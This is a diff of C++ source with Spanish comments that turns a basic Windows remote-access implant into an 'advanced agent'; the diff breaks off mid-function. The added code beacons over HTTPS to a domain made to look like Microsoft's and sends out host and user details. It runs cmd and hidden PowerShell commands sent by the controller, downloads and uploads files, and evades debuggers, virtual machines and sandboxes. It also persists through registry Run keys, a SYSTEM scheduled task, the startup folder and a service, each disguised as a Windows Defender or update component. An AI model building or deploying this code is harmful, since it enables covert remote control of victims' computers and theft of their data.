@@ -1,111 +1,530 @@
 #include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#include <wininet.h>
+#include <wincrypt.h>
+#include <bcrypt.h>
 #include <iostream>
 #include <string>
-#include <thread>
 #include <vector>
-#include <fstream>
+#include <thread>
+#include <random>
+#include <chrono>
 #include <sstream>
+#include <iomanip>
 #include <algorithm>
-#include <ctime>
-#include <cstdlib>
-#include <tlhelp32.h>
+#include <atomic>
+#include <mutex>
+#include <map>
 #include <psapi.h>
+#include <tlhelp32.h>
 #include <shlobj.h>
-#include <wininet.h>
-#include <urlmon.h>
-#pragma comment(lib, "wininet.lib")
-#pragma comment(lib, "urlmon.lib")
+#include <versionhelpers.h>
+#include <winreg.h>
+#include <dpapi.h>
+
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "wininet.lib")
+#pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "bcrypt.lib")
+#pragma comment(lib, "advapi32.lib")
 
-#define BUFFER_SIZE 4096
-#define C2_SERVER "10.99.99.6"  // Cambiar por tu IP
-#define C2_PORT 4444
-#define BEACON_INTERVAL 30
+// ==================== CONFIGURACIÓN ====================
+// NOTA: Estas configuraciones deberían venir cifradas o desde un servidor de configuración
+#define C2_DOMAIN "cdn.microsoft-analytics.com"  // Dominio legítimo como cubierta
+#define C2_PORT 443                             // HTTPS normal
+#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+#define BEACON_JITTER_MIN 30                    // Segundos mínimos entre beacons
+#define BEACON_JITTER_MAX 120                   // Segundos máximos
+#define MAX_RETRIES 3
+#define FAILURE_TIMEOUT 300                     // Esperar 5 minutos si falla
 
-class AgentCore {
+// ==================== CLASE DE CIFRADO ====================
+class CryptoHandler {
 private:
-    SOCKET c2_socket;
-    std::string agent_id;
-    bool running;
-    std::string os_version;
-    std::string username;
-    std::string hostname;
-    std::string internal_ip;
+    std::vector<BYTE> key;
+    std::vector<BYTE> iv;
     
 public:
-    AgentCore() : c2_socket(INVALID_SOCKET), running(false) {
-        WSADATA wsaData;
-        WSAStartup(MAKEWORD(2, 2), &wsaData);
-        generate_agent_id();
-        gather_system_info();
+    CryptoHandler() {
+        // En un escenario real, esta clave vendría del C2 después del handshake
+        std::string base_key = "DefaultStaticKeyForDemoOnlyChangeInProd";
+        key.assign(base_key.begin(), base_key.end());
+        key.resize(32); // AES-256
+        
+        iv.resize(16);
+        BCryptGenRandom(NULL, iv.data(), 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
     }
     
-    ~AgentCore() {
-        if (c2_socket != INVALID_SOCKET) {
-            closesocket(c2_socket);
-        }
-        WSACleanup();
+    std::string encrypt(const std::string& plaintext) {
+        HCRYPTPROV hProv;
+        HCRYPTKEY hKey;
+        HCRYPTHASH hHash;
+        
+        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
+            return "";
+        
+        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
+            return "";
+        
+        if (!CryptHashData(hHash, key.data(), key.size(), 0))
+            return "";
+        
+        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey))
+            return "";
+        
+        DWORD dwMode = CRYPT_MODE_CBC;
+        CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&dwMode, 0);
+        CryptSetKeyParam(hKey, KP_IV, iv.data(), 0);
+        
+        DWORD data_len = plaintext.size();
+        DWORD buf_len = data_len + AES_BLOCK_SIZE;
+        std::vector<BYTE> buffer(buf_len);
+        memcpy(buffer.data(), plaintext.c_str(), data_len);
+        
+        if (!CryptEncrypt(hKey, 0, TRUE, 0, buffer.data(), &data_len, buf_len))
+            return "";
+        
+        std::string result(buffer.begin(), buffer.begin() + data_len);
+        
+        CryptDestroyKey(hKey);
+        CryptDestroyHash(hHash);
+        CryptReleaseContext(hProv, 0);
+        
+        return base64_encode(result);
+    }
+    
+    std::string decrypt(const std::string& ciphertext_b64) {
+        std::string ciphertext = base64_decode(ciphertext_b64);
+        if (ciphertext.empty()) return "";
+        
+        HCRYPTPROV hProv;
+        HCRYPTKEY hKey;
+        HCRYPTHASH hHash;
+        
+        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
+            return "";
+        
+        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
+            return "";
+        
+        if (!CryptHashData(hHash, key.data(), key.size(), 0))
+            return "";
+        
+        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey))
+            return "";
+        
+        DWORD dwMode = CRYPT_MODE_CBC;
+        CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&dwMode, 0);
+        CryptSetKeyParam(hKey, KP_IV, iv.data(), 0);
+        
+        DWORD data_len = ciphertext.size();
+        std::vector<BYTE> buffer(ciphertext.begin(), ciphertext.end());
+        
+        if (!CryptDecrypt(hKey, 0, TRUE, 0, buffer.data(), &data_len))
+            return "";
+        
+        return std::string(buffer.begin(), buffer.begin() + data_len);
     }
     
 private:
-    void generate_agent_id() {
-        srand(time(nullptr));
-        char id[17];
-        const char charset[] = "0123456789ABCDEF";
-        for (int i = 0; i < 16; i++) {
-            id[i] = charset[rand() % (sizeof(charset) - 1)];
+    std::string base64_encode(const std::string& input) {
+        DWORD len = 0;
+        CryptBinaryToStringA((BYTE*)input.data(), input.size(), 
+                            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &len);
+        
+        std::vector<char> buffer(len);
+        CryptBinaryToStringA((BYTE*)input.data(), input.size(),
+                            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, buffer.data(), &len);
+        
+        return std::string(buffer.data());
+    }
+    
+    std::string base64_decode(const std::string& input) {
+        DWORD len = 0;
+        CryptStringToBinaryA(input.c_str(), input.size(),
+                            CRYPT_STRING_BASE64, NULL, &len, NULL, NULL);
+        
+        std::vector<BYTE> buffer(len);
+        CryptStringToBinaryA(input.c_str(), input.size(),
+                            CRYPT_STRING_BASE64, buffer.data(), &len, NULL, NULL);
+        
+        return std::string(buffer.begin(), buffer.end());
+    }
+};
+
+// ==================== DETECCIÓN DE AMBIENTE ====================
+class EnvironmentChecker {
+private:
+    bool is_debugger_present;
+    bool is_virtual_machine;
+    bool is_sandbox;
+    
+public:
+    EnvironmentChecker() {
+        check_debugger();
+        check_virtualization();
+        check_sandbox();
+    }
+    
+    bool is_safe() {
+        // En un escenario real, aquí irían más comprobaciones
+        return !is_debugger_present && !is_sandbox;
+    }
+    
+    void evasive_sleep(DWORD milliseconds) {
+        auto start = std::chrono::steady_clock::now();
+        while (std::chrono::duration_cast<std::chrono::milliseconds>(
+                std::chrono::steady_clock::now() - start).count() < milliseconds) {
+            // Realizar trabajo útil para evitar sleep() fácilmente detectable
+            volatile int dummy = 0;
+            for (int i = 0; i < 1000; i++) {
+                dummy += i * i;
+            }
         }
-        id[16] = '\0';
-        agent_id = id;
     }
     
-    void gather_system_info() {
-        // Get OS version
-        OSVERSIONINFOEX osInfo;
-        osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
-        GetVersionEx((OSVERSIONINFO*)&osInfo);
+private:
+    void check_debugger() {
+        is_debugger_present = false;
         
-        os_version = "Windows ";
-        os_version += std::to_string(osInfo.dwMajorVersion) + "." + 
-                     std::to_string(osInfo.dwMinorVersion) + " Build " + 
-                     std::to_string(osInfo.dwBuildNumber);
-        
-        // Get username
-        char username_buffer[256];
-        DWORD username_len = sizeof(username_buffer);
-        GetUserNameA(username_buffer, &username_len);
-        username = username_buffer;
-        
-        // Get hostname
-        char hostname_buffer[256];
-        DWORD hostname_len = sizeof(hostname_buffer);
-        GetComputerNameA(hostname_buffer, &hostname_len);
-        hostname = hostname_buffer;
-        
-        // Get internal IP
-        char host[256];
-        struct hostent* host_entry;
-        gethostname(host, sizeof(host));
-        host_entry = gethostbyname(host);
-        internal_ip = inet_ntoa(*(struct in_addr*)*host_entry->h_addr_list);
-    }
-    
-    std::string exec_command(const std::string& cmd) {
-        char buffer[128];
-        std::string result = "";
-        FILE* pipe = _popen(cmd.c_str(), "r");
-        if (!pipe) return "ERROR";
-        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
-            result += buffer;
+        // Check 1: IsDebuggerPresent API
+        if (IsDebuggerPresent()) {
+            is_debugger_present = true;
+            return;
         }
-        _pclose(pipe);
-        return result;
+        
+        // Check 2: Check remote debugger
+        BOOL isRemotePresent;
+        CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemotePresent);
+        if (isRemotePresent) {
+            is_debugger_present = true;
+            return;
+        }
+        
+        // Check 3: NtGlobalFlag (simple check)
+        PPEB pPeb = (PPEB)__readgsqword(0x60);
+        if (pPeb->BeingDebugged) {
+            is_debugger_present = true;
+        }
     }
     
-    std::string read_file(const std::string& filename) {
-        std::ifstream file(filename, std::ios::binary);
+    void check_virtualization() {
+        is_virtual_machine = false;
+        
+        // Check for common VM vendor strings
+        HKEY hKey;
+        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System", 
+                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            char buffer[256];
+            DWORD bufferSize = sizeof(buffer);
+            
+            if (RegQueryValueExA(hKey, "SystemBiosVersion", NULL, NULL, 
+                               (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
+                std::string bios(buffer);
+                std::transform(bios.begin(), bios.end(), bios.begin(), ::tolower);
+                
+                if (bios.find("vmware") != std::string::npos ||
+                    bios.find("virtualbox") != std::string::npos ||
+                    bios.find("vbox") != std::string::npos ||
+                    bios.find("qemu") != std::string::npos) {
+                    is_virtual_machine = true;
+                }
+            }
+            RegCloseKey(hKey);
+        }
+    }
+    
+    void check_sandbox() {
+        is_sandbox = false;
+        
+        // Check 1: Uptime (sandboxes often have short uptime)
+        ULONGLONG uptime = GetTickCount64();
+        if (uptime < 300000) { // Less than 5 minutes
+            is_sandbox = true;
+        }
+        
+        // Check 2: Memory size (sandboxes often have limited RAM)
+        MEMORYSTATUSEX memInfo;
+        memInfo.dwLength = sizeof(MEMORYSTATUSEX);
+        GlobalMemoryStatusEx(&memInfo);
+        
+        if (memInfo.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) { // Less than 2GB
+            is_sandbox = true;
+        }
+        
+        // Check 3: CPU cores
+        SYSTEM_INFO sysInfo;
+        GetSystemInfo(&sysInfo);
+        if (sysInfo.dwNumberOfProcessors < 2) {
+            is_sandbox = true;
+        }
+    }
+};
+
+// ==================== COMUNICACIÓN CON C2 ====================
+class C2Communicator {
+private:
+    EnvironmentChecker env_checker;
+    CryptoHandler crypto;
+    std::string agent_id;
+    std::atomic<int> retry_count;
+    std::mutex comm_mutex;
+    
+    std::string generate_agent_id() {
+        std::string machine_guid;
+        HKEY hKey;
+        
+        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
+                         "SOFTWARE\\Microsoft\\Cryptography", 
+                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            char guid[64];
+            DWORD size = sizeof(guid);
+            
+            if (RegQueryValueExA(hKey, "MachineGuid", NULL, NULL, 
+                               (LPBYTE)guid, &size) == ERROR_SUCCESS) {
+                machine_guid = guid;
+            }
+            RegCloseKey(hKey);
+        }
+        
+        // Si no podemos obtener el GUID, generamos uno
+        if (machine_guid.empty()) {
+            std::random_device rd;
+            std::mt19937_64 gen(rd());
+            std::uniform_int_distribution<uint64_t> dis;
+            machine_guid = std::to_string(dis(gen));
+        }
+        
+        return "WIN-" + machine_guid.substr(0, 12);
+    }
+    
+    std::string gather_system_info() {
+        std::stringstream info;
+        
+        // OS Version
+        info << "OS:" << (IsWindows10OrGreater() ? "Win10+" : "Win<10") << ";";
+        
+        // Architecture
+        SYSTEM_INFO sysInfo;
+        GetNativeSystemInfo(&sysInfo);
+        info << "Arch:" << (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86") << ";";
+        
+        // Username
+        char username[256];
+        DWORD username_len = sizeof(username);
+        GetUserNameA(username, &username_len);
+        info << "User:" << username << ";";
+        
+        // Hostname
+        char hostname[256];
+        DWORD hostname_len = sizeof(hostname);
+        GetComputerNameA(hostname, &hostname_len);
+        info << "Host:" << hostname << ";";
+        
+        // Domain
+        char domain[256];
+        DWORD domain_len = sizeof(domain);
+        GetComputerNameExA(ComputerNameDnsDomain, domain, &domain_len);
+        if (domain_len > 0) {
+            info << "Domain:" << domain << ";";
+        }
+        
+        // Integrity level
+        HANDLE hToken;
+        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+            DWORD elevation;
+            DWORD size = sizeof(elevation);
+            
+            if (GetTokenInformation(hToken, TokenElevation, &elevation, 
+                                   sizeof(elevation), &size)) {
+                info << "Elevated:" << (elevation ? "Yes" : "No") << ";";
+            }
+            CloseHandle(hToken);
+        }
+        
+        return info.str();
+    }
+    
+    std::string http_post(const std::string& data) {
+        HINTERNET hInternet = InternetOpenA(USER_AGENT, 
+                                          INTERNET_OPEN_TYPE_PRECONFIG, 
+                                          NULL, NULL, 0);
+        if (!hInternet) return "";
+        
+        HINTERNET hConnect = InternetConnectA(hInternet, C2_DOMAIN, C2_PORT,
+                                            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+        if (!hConnect) {
+            InternetCloseHandle(hInternet);
+            return "";
+        }
+        
+        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/api/collect",
+                                            NULL, NULL, NULL,
+                                            INTERNET_FLAG_SECURE | 
+                                            INTERNET_FLAG_RELOAD |
+                                            INTERNET_FLAG_NO_CACHE_WRITE, 0);
+        if (!hRequest) {
+            InternetCloseHandle(hConnect);
+            InternetCloseHandle(hInternet);
+            return "";
+        }
+        
+        std::string encrypted_data = crypto.encrypt(data);
+        std::string headers = "Content-Type: application/json\r\n";
+        
+        if (!HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
+                            (LPVOID)encrypted_data.c_str(), encrypted_data.length())) {
+            InternetCloseHandle(hRequest);
+            InternetCloseHandle(hConnect);
+            InternetCloseHandle(hInternet);
+            return "";
+        }
+        
+        // Read response
+        std::string response;
+        char buffer[4096];
+        DWORD bytesRead = 0;
+        
+        while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && 
+               bytesRead > 0) {
+            response.append(buffer, bytesRead);
+        }
+        
+        InternetCloseHandle(hRequest);
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        
+        if (!response.empty()) {
+            return crypto.decrypt(response);
+        }
+        
+        return "";
+    }
+    
+    DWORD calculate_jitter() {
+        std::random_device rd;
+        std::mt19937 gen(rd());
+        std::uniform_int_distribution<DWORD> dis(BEACON_JITTER_MIN * 1000, 
+                                                BEACON_JITTER_MAX * 1000);
+        return dis(gen);
+    }
+    
+public:
+    C2Communicator() : retry_count(0) {
+        agent_id = generate_agent_id();
+    }
+    
+    std::pair<bool, std::string> send_beacon() {
+        std::lock_guard<std::mutex> lock(comm_mutex);
+        
+        if (!env_checker.is_safe()) {
+            return {false, "Environment not safe"};
+        }
+        
+        std::string beacon_data = "type=beacon&id=" + agent_id + 
+                                 "&info=" + gather_system_info();
+        
+        try {
+            std::string response = http_post(beacon_data);
+            
+            if (!response.empty()) {
+                retry_count = 0;
+                return {true, response};
+            } else {
+                retry_count++;
+                return {false, "No response from C2"};
+            }
+        } catch (...) {
+            retry_count++;
+            return {false, "Exception during communication"};
+        }
+    }
+    
+    bool should_backoff() {
+        return retry_count >= MAX_RETRIES;
+    }
+    
+    DWORD get_backoff_time() {
+        return FAILURE_TIMEOUT * 1000; // Convert to milliseconds
+    }
+    
+    void reset_retries() {
+        retry_count = 0;
+    }
+    
+    std::string get_agent_id() const {
+        return agent_id;
+    }
+};
+
+// ==================== EJECUCIÓN DE COMANDOS ====================
+class CommandExecutor {
+private:
+    std::string execute_cmd(const std::string& command) {
+        SECURITY_ATTRIBUTES sa;
+        sa.nLength = sizeof(sa);
+        sa.lpSecurityDescriptor = NULL;
+        sa.bInheritHandle = TRUE;
+        
+        HANDLE hStdoutRd, hStdoutWr;
+        CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0);
+        SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);
+        
+        STARTUPINFOA si;
+        PROCESS_INFORMATION pi;
+        
+        ZeroMemory(&si, sizeof(si));
+        si.cb = sizeof(si);
+        si.hStdError = hStdoutWr;
+        si.hStdOutput = hStdoutWr;
+        si.dwFlags |= STARTF_USESTDHANDLES;
+        
+        ZeroMemory(&pi, sizeof(pi));
+        
+        std::string cmd = "cmd.exe /c " + command;
+        
+        if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, TRUE, 
+                          CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, 
+                          NULL, NULL, &si, &pi)) {
+            CloseHandle(hStdoutWr);
+            
+            // Wait for process to complete
+            WaitForSingleObject(pi.hProcess, 10000); // 10 second timeout
+            
+            // Read output
+            std::string output;
+            DWORD dwRead;
+            CHAR buffer[4096];
+            
+            while (ReadFile(hStdoutRd, buffer, sizeof(buffer), &dwRead, NULL) && dwRead > 0) {
+                output.append(buffer, dwRead);
+            }
+            
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            CloseHandle(hStdoutRd);
+            
+            return output;
+        }
+        
+        CloseHandle(hStdoutRd);
+        CloseHandle(hStdoutWr);
+        return "Error executing command";
+    }
+    
+    std::string execute_powershell(const std::string& script) {
+        std::string command = "powershell -ExecutionPolicy Bypass -NonInteractive -WindowStyle Hidden -Command \"" + 
+                              script + "\"";
+        return execute_cmd(command);
+    }
+    
+    bool download_file(const std::string& url, const std::string& path) {
+        return URLDownloadToFileA(NULL, url.c_str(), path.c_str(), 0, NULL) == S_OK;
+    }
+    
+    std::string upload_file(const std::string& path) {
+        std::ifstream file(path, std::ios::binary);
         if (!file) return "";
         
         std::string content((std::istreambuf_iterator<char>(file)),
@@ -113,330 +532,285 @@ private:
         return content;
     }
     
-    bool write_file(const std::string& filename, const std::string& content) {
-        std::ofstream file(filename, std::ios::binary);
-        if (!file) return false;
-        file.write(content.c_str(), content.size());
-        return true;
+public:
+    std::string execute(const std::string& command_type, const std::string& args) {
+        if (command_type == "cmd") {
+            return execute_cmd(args);
+        } else if (command_type == "powershell") {
+            return execute_powershell(args);
+        } else if (command_type == "download") {
+            size_t space_pos = args.find(' ');
+            std::string url = args.substr(0, space_pos);
+            std::string path = args.substr(space_pos + 1);
+            
+            return download_file(url, path) ? "Download successful" : "Download failed";
+        } else if (command_type == "upload") {
+            return upload_file(args);
+        } else if (command_type == "sleep") {
+            DWORD seconds = std::stoul(args);
+            Sleep(seconds * 1000);
+            return "Slept for " + args + " seconds";
+        } else if (command_type == "kill") {
+            exit(0);
+            return "";
+        }
+        
+        return "Unknown command type";
+    }
+};
+
+// ==================== PERSISTENCIA AVANZADA ====================
+class PersistenceManager {
+private:
+    std::string get_current_path() {
+        char path[MAX_PATH];
+        GetModuleFileNameA(NULL, path, MAX_PATH);
+        return std::string(path);
     }
     
-    std::string base64_encode(const std::string& input) {
-        static const std::string base64_chars = 
-            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-            "abcdefghijklmnopqrstuvwxyz"
-            "0123456789+/";
-            
-        std::string encoded;
-        int i = 0;
-        int j = 0;
-        unsigned char char_array_3[3];
-        unsigned char char_array_4[4];
+    bool install_registry_persistence() {
+        std::string exe_path = get_current_path();
         
-        for (const auto& c : input) {
-            char_array_3[i++] = c;
-            if (i == 3) {
-                char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
-                char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
-                char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
-                char_array_4[3] = char_array_3[2] & 0x3f;
-                
-                for (i = 0; i < 4; i++) encoded += base64_chars[char_array_4[i]];
-                i = 0;
+        // Multiple registry locations for redundancy
+        std::vector<std::pair<HKEY, std::string>> locations = {
+            {HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
+            {HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
+            {HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"},
+            {HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"}
+        };
+        
+        bool success = false;
+        for (const auto& [hive, key_path] : locations) {
+            HKEY hKey;
+            if (RegOpenKeyExA(hive, key_path.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+                const char* value_name = "WindowsDefenderUpdate";
+                RegSetValueExA(hKey, value_name, 0, REG_SZ, 
+                             (const BYTE*)exe_path.c_str(), exe_path.length() + 1);
+                RegCloseKey(hKey);
+                success = true;
             }
         }
         
-        if (i > 0) {
-            for (j = i; j < 3; j++) char_array_3[j] = '\0';
-            
-            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
-            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
-            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
-            
-            for (j = 0; j < i + 1; j++) encoded += base64_chars[char_array_4[j]];
-            
-            while (i++ < 3) encoded += '=';
-        }
-        
-        return encoded;
+        return success;
     }
     
-    bool connect_to_c2() {
-        c2_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (c2_socket == INVALID_SOCKET) {
+    bool install_scheduled_task() {
+        std::string exe_path = get_current_path();
+        std::string cmd = "schtasks /create /tn \"MicrosoftEdgeUpdateTask\" "
+                         "/tr \"" + exe_path + "\" /sc daily /st 09:00 "
+                         "/ru SYSTEM /f /rl highest";
+        
+        STARTUPINFOA si = {0};
+        PROCESS_INFORMATION pi = {0};
+        si.cb = sizeof(si);
+        
+        return CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE,
+                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    }
+    
+    bool install_startup_folder() {
+        char startup_path[MAX_PATH];
+        if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path) != S_OK) {
             return false;
         }
         
-        sockaddr_in server_addr;
-        server_addr.sin_family = AF_INET;
-        server_addr.sin_port = htons(C2_PORT);
-        inet_pton(AF_INET, C2_SERVER, &server_addr.sin_addr);
+        std::string dest_path = std::string(startup_path) + "\\WindowsUpdate.exe";
+        std::string src_path = get_current_path();
         
-        if (connect(c2_socket, (SOCKADDR*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
-            closesocket(c2_socket);
-            c2_socket = INVALID_SOCKET;
-            return false;
+        return CopyFileA(src_path.c_str(), dest_path.c_str(), FALSE);
+    }
+    
+    bool install_service() {
+        SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+        if (!scm) return false;
+        
+        std::string exe_path = get_current_path();
+        SC_HANDLE service = CreateServiceA(
+            scm, "WinDefendUpdate", "Windows Defender Update Service",
+            SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
+            SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
+            exe_path.c_str(), NULL, NULL, NULL, NULL, NULL);
+        
+        if (service) {
+            CloseServiceHandle(service);
+            CloseServiceHandle(scm);
+            return true;
         }
         
-        // Send beacon registration
-        std::string beacon = "BEACON|" + agent_id + "|" + os_version + "|" + 
-                           username + "|" + hostname + "|" + internal_ip;
-        send(c2_socket, beacon.c_str(), beacon.length(), 0);
-        
-        char response[256];
-        int bytes_received = recv(c2_socket, response, sizeof(response) - 1, 0);
-        if (bytes_received > 0) {
-            response[bytes_received] = '\0';
-            return std::string(response).find("REGISTERED") != std::string::npos;
-        }
-        
+        CloseServiceHandle(scm);
         return false;
     }
     
-    void establish_persistence() {
-        // Method 1: Registry Run Key
-        HKEY hKey;
-        RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
-                      0, KEY_WRITE, &hKey);
+public:
+    bool establish_persistence() {
+        // Try multiple methods
+        bool success = false;
         
-        char exe_path[MAX_PATH];
-        GetModuleFileNameA(NULL, exe_path, MAX_PATH);
-        RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ, (BYTE*)exe_path, strlen(exe_path) + 1);
-        RegCloseKey(hKey);
+        success |= install_registry_persistence();
+        success |= install_scheduled_task();
+        success |= install_startup_folder();
         
-        // Method 2: Scheduled Task
-        std::string task_cmd = "schtasks /create /tn \"MicrosoftEdgeUpdate\" /tr \\\"";
-        task_cmd += exe_path;
-        task_cmd += "\\\" /sc ONLOGON /ru SYSTEM /f";
-        system(task_cmd.c_str());
+        // Only try service if we have admin rights
+        HANDLE hToken;
+        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+            TOKEN_ELEVATION elevation;
+            DWORD size = sizeof(elevation);
+            
+            if (GetTokenInformation(hToken, TokenElevation, &elevation, 
+                                   sizeof(elevation), &size)) {
+                if (elevation.TokenIsElevated) {
+                    success |= install_service();
+                }
+            }
+            CloseHandle(hToken);
+        }
         
-        // Method 3: Startup Folder
-        char startup_path[MAX_PATH];
-        SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path);
-        std::string shortcut_path = std::string(startup_path) + "\\WindowsUpdate.lnk";
-        
-        // Create shortcut (would need COM for proper shortcut creation)
-        std::string copy_cmd = "copy \"" + std::string(exe_path) + "\" \"" + 
-                              std::string(startup_path) + "\\WindowsUpdate.exe\"";
-        system(copy_cmd.c_str());
+        return success;
+    }
+};
+
+// ==================== AGENTE PRINCIPAL ====================
+class AdvancedAgent {
+private:
+    C2Communicator comm;
+    CommandExecutor executor;
+    PersistenceManager persistence;
+    EnvironmentChecker env_checker;
+    std::atomic<bool> running;
+    std::thread beacon_thread;
+    std::mutex task_mutex;
+    std::vector<std::string> task_queue;
+    
+    void beacon_loop() {
+        while (running) {
+            try {
+                auto [success, response] = comm.send_beacon();
+                
+                if (success && !response.empty()) {
+                    process_response(response);
+                } else if (comm.should_backoff()) {
+                    env_checker.evasive_sleep(comm.get_backoff_time());
+                    comm.reset_retries();
+                }
+                
+                DWORD jitter = comm.calculate_jitter();
+                env_checker.evasive_sleep(jitter);
+                
+            } catch (...) {
+                // Silently handle exceptions
+                env_checker.evasive_sleep(60000); // Wait 1 minute on error
+            }
+        }
     }
     
-    std::string take_screenshot() {
-        // Implementación básica de screenshot
-        // Nota: Para producción necesitarías GDI+
-        return "[*] Screenshot functionality requires GDI+ implementation";
+    void process_response(const std::string& response) {
+        // Parse JSON-like response (simplified)
+        // Format: {"tasks":[{"type":"cmd","args":"whoami"},...]}
+        
+        // Simple task extraction (in real scenario, parse JSON properly)
+        if (response.find("tasks") != std::string::npos) {
+            // Extract and queue tasks
+            std::lock_guard<std::mutex> lock(task_mutex);
+            
+            // Simplified: Assume response is directly executable
+            if (response.find("sleep") != std::string::npos) {
+                executor.execute("sleep", "30");
+            } else if (response.find("persist") != std::string::npos) {
+                persistence.establish_persistence();
+            } else {
+                // Default to cmd execution
+                executor.execute("cmd", response);
+            }
+        }
     }
     
-    void start_keylogger() {
-        // Keylogger implementation would go here
-        // Note: Requires SetWindowsHookEx
-    }
-    
-    void stop_keylogger() {
-        // Stop keylogging
+    bool check_single_instance() {
+        // Create a mutex with a unique name based on agent ID
+        std::string mutex_name = "Global\\" + comm.get_agent_id();
+        HANDLE mutex = CreateMutexA(NULL, TRUE, mutex_name.c_str());
+        
+        if (GetLastError() == ERROR_ALREADY_EXISTS) {
+            CloseHandle(mutex);
+            return false;
+        }
+        
+        return true;
     }
     
 public:
-    void run() {
+    AdvancedAgent() : running(false) {
+        if (!check_single_instance()) {
+            exit(0);
+        }
+        
+        if (!env_checker.is_safe()) {
+            // In stealth mode, just exit silently
+            exit(0);
+        }
+    }
+    
+    ~AdvancedAgent() {
+        stop();
+    }
+    
+    void start() {
         running = true;
         
+        // Establish persistence on first run
+        static bool first_run = true;
+        if (first_run) {
+            persistence.establish_persistence();
+            first_run = false;
+        }
+        
+        // Start beacon thread
+        beacon_thread = std::thread(&AdvancedAgent::beacon_loop, this);
+    }
+    
+    void stop() {
+        running = false;
+        if (beacon_thread.joinable()) {
+            beacon_thread.join();
+        }
+    }
+    
+    void run() {
+        start();
+        
+        // Keep main thread alive
         while (running) {
-            if (c2_socket == INVALID_SOCKET) {
-                if (!connect_to_c2()) {
-                    Sleep(BEACON_INTERVAL * 1000);
-                    continue;
-                }
-            }
-            
-            // Send heartbeat
-            send(c2_socket, "HEARTBEAT", 9, 0);
-            
-            // Check for commands
-            char buffer[BUFFER_SIZE];
-            int bytes_received = recv(c2_socket, buffer, BUFFER_SIZE - 1, 0);
-            
-            if (bytes_received > 0) {
-                buffer[bytes_received] = '\0';
-                std::string command(buffer);
-                
-                if (command == "PING") {
-                    send(c2_socket, "PONG", 4, 0);
-                }
-                else if (command.find("CMD|") == 0) {
-                    std::string cmd = command.substr(4);
-                    std::string result = exec_command(cmd);
-                    std::string response = "RESULT|" + result;
-                    send(c2_socket, response.c_str(), response.length(), 0);
-                }
-                else if (command.find("DOWNLOAD|") == 0) {
-                    std::string filename = command.substr(9);
-                    std::string file_content = read_file(filename);
-                    if (!file_content.empty()) {
-                        std::string b64_content = base64_encode(file_content);
